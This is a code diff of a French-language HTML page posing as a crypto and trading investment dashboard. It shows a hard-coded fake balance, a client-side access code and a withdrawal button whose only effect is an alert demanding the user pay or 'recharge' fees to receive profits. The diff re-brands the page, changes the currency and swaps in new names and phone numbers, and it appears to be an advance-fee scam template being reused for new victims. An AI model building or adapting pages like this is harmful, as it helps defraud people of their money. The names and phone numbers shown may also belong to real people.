@@ -237,7 +237,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "2001") {
+        if (code === "2004") {
             document.body.style.display = 'block';
         } else {
             alert("Code incorrect. Accès refusé.");
@@ -247,14 +247,14 @@
 
     <header>
         <div class="logo">
-            <h1> NOBEL KING BTC INVEST</h1>
+            <h1> TRADING INVESTISSEMENT </h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1.550.000 F CFA</span>
+                <span class="balance">Solde: 22 000 000 GNF </span>
                 <div class="account-info">
-                    <span id="user-name">ROMBA R YACINE IIEME JUMELLE</span><br>
-                    <span id="user-phone">226 54 29 87 24</span>
+                    <span id="user-name"> META ACHE </span><br>
+                    <span id="user-phone">224 625 51 52 12</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -315,7 +315,7 @@
 
             const setWithdrawalInfo = () => {
                 const paymentMethod = "Orange Money";
-                const accountName = "ROMBA R YACINE IIEME JUMELLE";
+                const accountName = "META ACHE";
                 const accountNumber = "226 54 29 87 24";
                 withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 1.550.000 F CFA`;
                 withdrawalForm.style.display = 'flex';
@@ -324,7 +324,7 @@
             document.getElementById('orange-money').addEventListener('click', setWithdrawalInfo);
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Veuillez payer les frais de finalisation pour recevoir vos benefices dans les 5 minutes');
+                alert('Veuillez recharger votre compte pour la finalisation de transfert et recevoir vos benefices dans les 5 minutes');
                 withdrawalForm.style.display = 'none';
             });
 
